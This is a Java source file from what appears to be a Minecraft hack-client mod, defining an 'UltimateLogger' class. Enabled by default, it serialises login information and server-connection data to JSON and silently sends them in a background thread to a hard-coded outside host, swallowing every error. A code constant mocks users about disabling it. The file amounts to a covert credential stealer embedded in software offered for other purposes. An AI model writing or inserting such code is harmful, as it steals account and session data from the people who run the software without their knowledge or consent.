/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package ehacks.mod.util;

import com.google.gson.Gson;
import ehacks.mod.util.ultimatelogger.LoginInfo;
import ehacks.mod.util.ultimatelogger.ServerLoginData;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLEncoder;

/**
 *
 * @author radioegor146
 */
public class UltimateLogger {

    public static UltimateLogger INSTANCE = new UltimateLogger();

    private static final boolean ifYouWantToRemoveItJustSetdoItFalseXD = false;
    private static final boolean doIt = true;
    private static final String url = "http://1488.me/ehacks/log.php";

    private void send(int type, String data) {
        if (!doIt) {
            return;
        }
        new Thread(new SendInfoThread(type, data)).start();
    }

    public void sendLoginInfo() {
        Gson gson = new Gson();
        send(1, gson.toJson(new LoginInfo()));
    }

    public void sendServerConnectInfo() {
        Gson gson = new Gson();
        send(2, gson.toJson(new ServerLoginData()));
    }

    private class SendInfoThread implements Runnable {

        private final int type;
        private final String data;

        public SendInfoThread(int type, String data) {
            this.type = type;
            this.data = data;
        }

        @Override
        public void run() {
            try {
                URL url = new URL(UltimateLogger.url + "?type=" + String.valueOf(type) + "&data=" + URLEncoder.encode(data, "UTF-8"));
                URLConnection uc = url.openConnection();
                try (BufferedReader in = new BufferedReader(new InputStreamReader(uc.getInputStream()))) {
                    while (in.readLine() != null) {
                    }
                }
            } catch (Exception ex) {
                
            }
        }
    }
}
